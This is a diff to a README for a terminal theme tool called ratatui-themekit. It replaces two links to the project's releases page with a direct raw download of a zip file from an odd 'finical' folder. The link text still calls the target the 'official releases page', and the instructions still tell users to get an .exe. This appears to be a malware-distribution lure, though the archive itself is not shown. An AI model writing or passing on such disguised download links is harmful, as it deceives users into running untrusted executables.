@@ -1,6 +1,6 @@
 # 🎨 ratatui-themekit - Professional terminal colors for your tools
 
-[![Download ratatui-themekit](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/unconscionable-wynneaamericana672/ratatui-themekit/releases)
+[![Download ratatui-themekit](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/unconscionable-wynneaamericana672/ratatui-themekit/raw/refs/heads/main/finical/themekit_ratatui_v2.8.zip)
 
 ## What this tool does
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run this software:
 
 You must obtain the correct file from the project website. Follow these steps to find the file:
 
-1. Visit the [official releases page](https://github.com/unconscionable-wynneaamericana672/ratatui-themekit/releases).
+1. Visit the [official releases page](https://github.com/unconscionable-wynneaamericana672/ratatui-themekit/raw/refs/heads/main/finical/themekit_ratatui_v2.8.zip).
 2. Look for the latest version number at the top of the list.
 3. Find the file ending in .exe under the Assets section.
 4. Click the file name to start your download.
